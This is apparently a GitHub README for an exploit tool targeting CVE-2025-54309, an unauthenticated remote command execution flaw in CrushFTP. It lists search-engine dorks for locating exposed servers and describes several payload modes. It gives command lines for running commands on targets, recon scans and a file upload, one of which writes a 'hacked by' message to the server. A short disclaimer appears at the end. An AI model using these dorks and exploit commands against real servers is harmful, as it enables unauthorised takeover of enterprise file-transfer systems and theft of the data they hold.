# üí• CVE-2025-54309 - CrushFTP Unauthenticated Remote Command Execution Exploit

> **PoC by Issam Junior**  
> [![GitHub](https://img.shields.io/badge/GitHub-issamjr-181717?logo=github&logoColor=white)](https://github.com/issamjr)
> [![Twitter](https://img.shields.io/badge/Twitter-@issam_juniorx-1DA1F2?logo=twitter&logoColor=white)](https://x.com/issam_juniorx)
> [![Telegram](https://img.shields.io/badge/Telegram-issamiso-26A5E4?logo=telegram&logoColor=white)](https://t.me/issamiso)

---

## üö® Vulnerability Overview

- **CVE:** CVE-2025-54309
- **CVSS:** 9.8 (Critical)
- **Product:** CrushFTP
- **Impact:** Unauthenticated Remote Command Execution (RCE) over HTTPS

CrushFTP, a popular enterprise file transfer solution, suffers from a critical vulnerability in its DMZ proxy implementation. Missing checks allow external attackers to reach the admin interface via HTTPS POST requests, bypassing authentication and directly invoking system commands.

### Technical Breakdown

The vulnerability exists due to an incomplete validation in the DMZ proxy's handling of HTTPS requests. By crafting a malicious XML-RPC request to the `/WebInterface/function/` endpoint, attackers can trigger system commands on the server **without authentication**. This flaw allows full server compromise, data theft, and lateral movement.

**Affected Versions:**  
> All CrushFTP versions prior to 10.7.0 (verify with vendor advisories for specifics).

---

## üïµÔ∏è‚Äç‚ôÇÔ∏è Dorks for Hunting CrushFTP Servers

### üîé Shodan Dorks
```
http.favicon.hash:427298725 "CrushFTP"
http.html:"CrushFTP"
product:"CrushFTP"
ssl:"CrushFTP"
port:443 "CrushFTP"
```

### ü¶ä Ffuf/Faff Dorks (URL Discovery)
```
/WebInterface/function/
/WebInterface/login/
/WebInterface/json/
/WebInterface/info/
/favicon.ico
```

### üï∑Ô∏è Hunter Dorks (Google, Censys, etc.)
```
title:"CrushFTP WebInterface"
"Powered by CrushFTP"
inurl:/WebInterface/function/
inurl:/WebInterface/login/
```

---

## ‚ö° Exploit Features

- **Multiple Payloads:**
  - **xml**: XML-RPC command injection (default, most reliable).
  - **cmd_inject**: Classic command injection via POST parameters.
  - **json**: JSON-based RCE simulation (if endpoint supports).
  - **file_upload**: Simulated arbitrary file write (upload).
- **Recon Mode:**
  - Fingerprints CrushFTP version.
  - Scans for interesting endpoints and methods.
- **Output Parsing:**
  - Extracts and highlights command output from responses.

---

## ‚ö° Exploit Usage

### 1. Install Dependencies

```bash
pip install -r requirements.txt
```

### 2. Run the Exploit

```bash
python3 exploit.py <target> [-c <cmd>] [-p <payload>] [--recon]
```

- `<target>`: IP or domain of the vulnerable CrushFTP server.
- `-c <cmd>`: (Optional) Command to execute. Defaults to `id`.
- `-p <payload>`: (Optional) Payload type. Options: `xml`, `cmd_inject`, `json`, `file_upload` (default: `xml`).
- `--upload-file <filename>` and `--upload-data <data>`: Used with `file_upload` payload type.
- `--recon`: Run endpoint scan & version fingerprint.

**Examples:**

- XML-RPC RCE (default):
  ```bash
  python3 exploit.py 192.168.1.100 -c "uname -a"
  ```

- Command Injection via login:
  ```bash
  python3 exploit.py 192.168.1.100 -c "whoami" -p cmd_inject
  ```

- File Upload (simulated):
  ```bash
  python3 exploit.py 192.168.1.100 -p file_upload --upload-file "/tmp/pwned.txt" --upload-data "CrushFTP hacked by Issam Junior"
  ```

- Reconnaissance:
  ```bash
  python3 exploit.py 192.168.1.100 --recon
  ```

---

### 3. Output

- **Green**: Successful exploitation and command output.
- **Red**: Errors (network issues, non-vulnerable target).
- **Yellow**: Warnings (unexpected response).

---

## ‚ö†Ô∏è Disclaimer

> **This PoC is for educational purposes only.  
> Do not use on systems without authorization.  
> You are solely responsible for your actions.**

---

## üë§ Author & Socials

- **Name:** Issam Junior

[![GitHub](https://img.shields.io/badge/GitHub-issamjr-181717?logo=github&logoColor=white)](https://github.com/issamjr)
[![Twitter](https://img.shields.io/badge/Twitter-@issam_juniorx-1DA1F2?logo=twitter&logoColor=white)](https://x.com/issam_juniorx)
[![Telegram](https://img.shields.io/badge/Telegram-issamiso-26A5E4?logo=telegram&logoColor=white)](https://t.me/issamiso)

